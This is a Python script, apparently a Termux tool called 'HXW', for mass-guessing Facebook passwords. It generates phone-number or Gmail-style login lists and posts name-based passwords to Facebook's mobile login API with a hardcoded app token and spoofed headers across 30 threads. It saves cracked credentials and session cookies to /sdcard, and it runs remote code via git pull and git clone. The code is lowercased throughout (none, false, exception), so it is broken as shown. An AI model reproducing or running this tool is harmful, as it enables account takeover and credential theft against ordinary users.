####@-----import-----@####
import os,base64

os.system('git pull -q;rm .rndm')
try:
	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
	from string import *
	from concurrent.futures import threadpoolexecutor as threadpool
except(importerror):
    os.system("pip install requests")
    pass


try:
    import bs4
except(importerror):
    os.system("pip install bs4")
    pass

try:
 pass
except:pass


import subprocess
from bs4 import beautifulsoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import connectionerror as cerror
from concurrent.futures import threadpoolexecutor as speed

accounts = []
loop = 0


####design####
def oo(t):
	return '\033[1;91m[\033[1;97m'+str(t)+'\033[1;91m]\033[1;97m '

###useragentsgen####
'''
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
android_version = subprocess.check_output('getprop ro.build.version.release',shell=true).decode('utf-8').replace('\n','')
andd=subprocess.check_output('getprop ro.product.brand',shell=true).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=true).decode('utf-8').replace('\n','')
carr=subprocess.check_output('getprop gsm.operator.alpha',shell=true).decode('utf-8').split(',')[1].replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=true).decode('utf-8').replace('\n','')
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
         'cr':carr,
         'brand':andd}
'''
ua = []

import requests
rs = requests.get
ua = []

del ua
"""
mozilla/5.0 (ipad; cpacc os 10_1_1 like mac os x) applewebkit/602.2.14 (khtml, like gecko) mobile/14b100 mozilla/5.0 (ipad; cpacc os 10_1_1 like mac os x) applewebkit/602.2.14 (khtml, like gecko) mobile/14b100 [fban/messengerforios;fbav/122.0.0.40.69;fbbv/61279955;fbdv/ipad4,1;fbmd/ipad;fbsn/ios;fbsv/10.1.1;fbss/2;fbcr/;fbid/tablet;fblc/vi_vn;fbop/5;fbrv/0]
"""

ua=[]

##logo##
p = '\x1b[1;97m'
g='\x1b[1;92m'
r='\x1b[1;91m'
s ='\x1b[1;96m'
y ='\x1b[1;93m'
uu ='\x1b[1;95m'
tred = speed

	
logo= f'''
{g}  ██   ██ ██   ██ ██     ██
{r}  ██   ██  ██ ██  ██     ██
{y}  ███████   ███   ██  █  ██
{s}  ██   ██  ██ ██  ██ ███ ██
{uu}  ██   ██ ██   ██  ███ ███ 
\033[1;93m=================================
\033[1;97m owner  : hannan x wasi :/
\033[1;97m github : hannan-404 :/
\033[1;97m version:\033[1;92m 0.8 \033[1;97m:/
\033[1;97m status : free :/
\033[1;97m notice : use 10007/10006 for more ok ids :/
\033[1;93m=================================
'''

####@-----menu-----@####
def hxw_main():
    os.system("clear")
    print(logo)
    print(f"{oo(1)}file cloning")
    print(f"{oo(2)}pak random cloning")
    print(f"{oo(3)}gmail cloning")  
    print(f"{oo(4)}create file")
    print(f"{oo(0)}exit")
    inpp = input(f"{oo('?')}your choice : ")
    if inpp == "1":
        file()
    if inpp == '2':pak()
    if inpp =='3':
        gmail()
    if inpp == "4":
     print(f'{oo("+")}loading best file create command ')
     os.system('cd && git clone --depth=1 https://github.com/hannan-404/file')
     os.system('cd && cd file ;python file.py')
     exit()
    if inpp == "0":
     exit('exit!')
     
     
l = []

####@-----file-----@####
def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.hannan'
    else:
        file = input(f"{oo('-')}enter file: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"{oo('!')}file not found");time.sleep(1)
        hxw_main()
     
    method()
    exit()
    
            
   
####@-----appcheck-----@####
def check(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = beautifulsoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
    	pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=hannan-33'))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = beautifulsoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('rijan','hxw-182^)code=hannan-2233]'))


####@-----gmail-----@####

def gmail():     
        os.system('rm -rf .hannan')
        first = input(f'{oo("?")}put first name: ')
        last = input(f'{oo("?")}put last name: ')
        domain = input(f'{oo("?")}put domain: ')
        try:
            limit = input(f'{oo("?")}put limit: ')
        except valueerror:
            limit = 5000
        lists = ['3','4']
        for xd in range(int(limit)):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.hannan', 'r').read().splitlines()
        with tred(max_workers=30) as king___xd:
            tl = str(len(fo))
            tk = first+last
            l.append('gm')
            file()

       
        
####@-----paknumber-----@####


def pak():
	user=[]
	code = input(f'{oo("!")}put code : ')
	try:
		limit = int(input(f'{oo("?")}put limit :  '))
	except valueerror:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	for psx in user:
		ids = code+psx
		open('.rndm','a').write(ids+'|'+psx+' '+ids+'\n')
	andom()



####@-----useragent----@####
"""
mozilla/5.0 (linux; android 11; infinix x695 build/rp1a.200720.011; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/90.0.4430.210 mobile safari/537.36 [fb_iab/orca-android;fbav/394.0.0.15.72;]
mozilla/5.0 (linux; android 13; v2169 build/tp1a.220624.014; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/109.0.5414.117 mobile safari/537.36 [fb_iab/orca-android;fbav/394.0.0.15.72;]
mozilla/5.0 (linux; android 13; sm-m127f build/tp1a.220624.014; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/109.0.5414.117 mobile safari/537.36 [fb_iab/orca-android;fbav/393.0.0.18.92;]
mozilla/5.0 (linux; android 11; itel s661lp build/rp1a.201005.001; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/109.0.5414.118 mobile safari/537.36 [fb_iab/orca-android;fbav/393.0.0.18.92;]
mozilla/5.0 (linux; android 7.1.1; n9560 build/nmf26f; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/55.0.2883.91 mobile safari/537.36 [fb_iab/orca-android;fbav/394.0.0.15.72;]
mozilla/5.0 (linux; android 12; 22041219c build/sp1a.210812.016; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/109.0.5414.117 mobile safari/537.36 [fb_iab/orca-android;fbav/393.0.0.18.92;]
mozilla/5.0 (linux; android 12; tecno kh6 build/sp1a.210812.016; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/99.0.4844.88 mobile safari/537.36 [fb_iab/orca-android;fbav/391.2.0.20.404;]
mozilla/5.0 (linux; android 11; mp02 build/rp1a.201005.001; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/109.0.5414.118 mobile safari/537.36 [fb_iab/orca-android;fbav/393.0.0.18.92;]
mozilla/5.0 (linux; android 12; cph2457 build/skq1.220303.001; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/109.0.5414.118 mobile safari/537.36 [fb_iab/orca-android;fbav/393.0.0.18.92;]
mozilla/5.0 (linux; android 11; t781spp build/rkq1.210614.002; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/92.0.4515.131 mobile safari/537.36 [fb_iab/orca-android;fbav/393.0.0.18.92;]
mozilla/5.0 (linux; android 10; z555 build/qp1a.190711.020; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/107.0.5304.141 mobile safari/537.36 [fb_iab/orca-android;fbav/388.0.0.23.106;]
mozilla/5.0 (linux; android 8.0.0; cubot_p20 build/o00623; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/109.0.5414.118 mobile safari/537.36 [fb_iab/orca-android;fbav/393.0.0.18.92;]
mozilla/5.0 (linux; android 12; sm-m515f build/sp1a.210812.016; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/96.0.4664.104 mobile safari/537.36 [fb_iab/orca-android;fbav/390.2.0.29.103;]
mozilla/5.0 (linux; android 10; eve-lx9n build/huaweieve-lx9n; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/88.0.4324.93 mobile safari/537.36 [fb_iab/orca-android;fbav/370.0.0.14.108;]
mozilla/5.0 (linux; android 12; 4188s build/sp1a.210812.016; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/109.0.5414.118 mobile safari/537.36 [fb_iab/orca-android;fbav/393.0.0.18.92;]
mozilla/5.0 (linux; android 11; armor 12 5g build/rp1a.200720.011; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/109.0.5414.85 mobile safari/537.36 [fb_iab/orca-android;fbav/393.0.0.18.92;]
mozilla/5.0 (linux; android 12; 22041216c build/sp1a.210812.016; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/109.0.5414.85 mobile safari/537.36 [fb_iab/orca-android;fbav/393.0.0.18.92;]
mozilla/5.0 (linux; android 10; cdy-nx9b build/huaweicdy-n29b; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/88.0.4324.93 mobile safari/537.36 [fb_iab/orca-android;fbav/391.0.0.0.302;]
mozilla/5.0 (linux; android 10; sts570 build/qp1a.190711.020; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/88.0.4324.181 mobile safari/537.36 [fb_iab/orca-android;fbav/389.1.0.23.214;]
mozilla/5.0 (linux; android 11; tecno kg6p build/rp1a.200720.011; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/109.0.5414.85 mobile safari/537.36 [fb_iab/orca-android;fbav/393.0.0.18.92;]
"""
####@-----filem-----@####


def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'{oo("?")}total password? : ')
        if lp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (etc)')
            for x in range(int(lp)):
                totalpass.append(input(f'{oo(x+1)}password : '))
            pass
        else:
            print(f"{oo('!')}numeric only")
            exit()
    print(f'\n'+oo("1")+'method 1 (updated)\n'+oo("2")+'method 2 (updated)')
    m=input(f"{oo('!')}input : ") 
    print('\n'+oo("?")+'do you want to show cp ids?(y/n)')
    cpok=input(f"{oo('!')}input : ")
    print('\n'+oo("?")+'do you want to show cookies?(y/n)')
    c=input(f"{oo('!')}input : ")
    apps='y'
    os.system("clear")
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("✓")}total ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}wait as you can :)")
    print(f"{oo('•')}/sdcard/hannan-ok.txt")
    print('\033[1;93m='*25)
    print()
    
    def start(user):
     try:
        global loop,accounts
        r = requests.session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mhxw-m1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mok : \033[1;92m{} \033[1;97mcp : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = none
            header = {"content-type": "application/x-www-form-accencoded","host": "graph.facebook.com","user-agent": heads,"x-fb-net-hni": "45204","x-fb-sim-hni": "45201","x-fb-connection-type": "unknown","x-tigon-is-retry": "false","x-fb-session-id": "nid=jiz+ynnbgbwc;pid=main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","x-fb-friendly-name": "viewerreactionsmutation","x-fb-request-analytics-tags": "graphservice","accept-encoding": "gzip, deflate","x-fb-http-engine": "liger","x-fb-client-ip": "true","x-fb-server-cluster": "true","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","connection": "keep-alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_us","client_country_code": "us","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.fb4aauthhandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=false)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mhannan-ok\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/hannan-ok.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mhannan-cp\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/hannan-cp.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except exception as e:time.sleep(10)
   


 
    def start2(user):
      global loop,accounts
      try:
        r = requests.session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mhxw-m2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mok : \033[1;92m{} \033[1;97mcp : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = none
            header = {"content-type": "application/x-www-form-accencoded","host": "graph.facebook.com","user-agent": heads,"x-fb-net-hni": "45204","x-fb-sim-hni": "45201","x-fb-connection-type": "unknown","x-tigon-is-retry": "false","x-fb-session-id": "nid=jiz+ynnbgbwc;pid=main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","x-fb-friendly-name": "viewerreactionsmutation","x-fb-request-analytics-tags": "graphservice","accept-encoding": "gzip, deflate","x-fb-http-engine": "liger","x-fb-client-ip": "true","x-fb-server-cluster": "true","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","connection": "keep-alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_us","client_country_code": "us","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.fb4aauthhandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=false)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mhannan-ok\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/hannan-ok.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mcookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mhannan-cp\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/hannan-cp.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except exception as e: time.sleep(10)

    if m=='2':
        with speed(max_workers=30) as speede:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()  
      



####@-----random-----@####
def andom():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o': 
        tpp = input(f'{oo("?")}total password? : ')
        totalpass.append('first')
        totalpass.append('last')
        if tpp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (etc)')
            for x in range(int(tpp)):
                totalpass.append(input(f'{oo(x+1)}password : '))
            pass
        else:
            print(f"{oo('!')}numeric only")
            exit()
    print(f'\n'+oo("1")+'method 1 (updated)\n'+oo("2")+'method 2 (updated)')
    m=input(f"{oo('!')}input : ") 
    print('\n'+oo("?")+'do you want to show cp ids?(y/n)')
    cpok=input(f"{oo('!')}input : ")
    print('\n'+oo("?")+'do you want to show cookies?(y/n)')
    c=input(f"{oo('!')}input : ")
    os.system("clear")
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("✓")}total ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}wait as you can :)")
    print(f"{oo('•')}/sdcard/hannan-ok.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
        global loop,accounts
        r = requests.session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mhxw-m1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mok : \033[1;92m{} \033[1;97mcp : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = none
            header = {"content-type": "application/x-www-form-accencoded","host": "graph.facebook.com","user-agent": heads,"x-fb-net-hni": "45204","x-fb-sim-hni": "45201","x-fb-connection-type": "unknown","x-tigon-is-retry": "false","x-fb-session-id": "nid=jiz+ynnbgbwc;pid=main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","x-fb-friendly-name": "viewerreactionsmutation","x-fb-request-analytics-tags": "graphservice","accept-encoding": "gzip, deflate","x-fb-http-engine": "liger","x-fb-client-ip": "true","x-fb-server-cluster": "true","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","connection": "keep-alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_us","client_country_code": "us","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.fb4aauthhandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=false)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mhannan-ok\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/hannan-ok.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mhannan-cp\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/hannan-cp.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except exception as e:time.sleep(10)
   



 
    def start2(user):
      global loop,accounts
      try:
        r = requests.session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mhxw-m2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mok : \033[1;92m{} \033[1;97mcp : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = none
            header = {"content-type": "application/x-www-form-accencoded","host": "graph.facebook.com","user-agent": heads,"x-fb-net-hni": "45204","x-fb-sim-hni": "45201","x-fb-connection-type": "unknown","x-tigon-is-retry": "false","x-fb-session-id": "nid=jiz+ynnbgbwc;pid=main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","x-fb-friendly-name": "viewerreactionsmutation","x-fb-request-analytics-tags": "graphservice","accept-encoding": "gzip, deflate","x-fb-http-engine": "liger","x-fb-client-ip": "true","x-fb-server-cluster": "true","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","connection": "keep-alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_us","client_country_code": "us","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.fb4aauthhandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=false)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mhannan-ok\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/hannan-ok.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mcookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mhannan-cp\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/hannan-cp.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except exception as e: time.sleep(10)

      
    for x in open('.rndm','r').read().splitlines():
    	accounts.append(x)
    
    if m=='2':
        with speed(max_workers=30) as speeed:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()




hxw_main() 
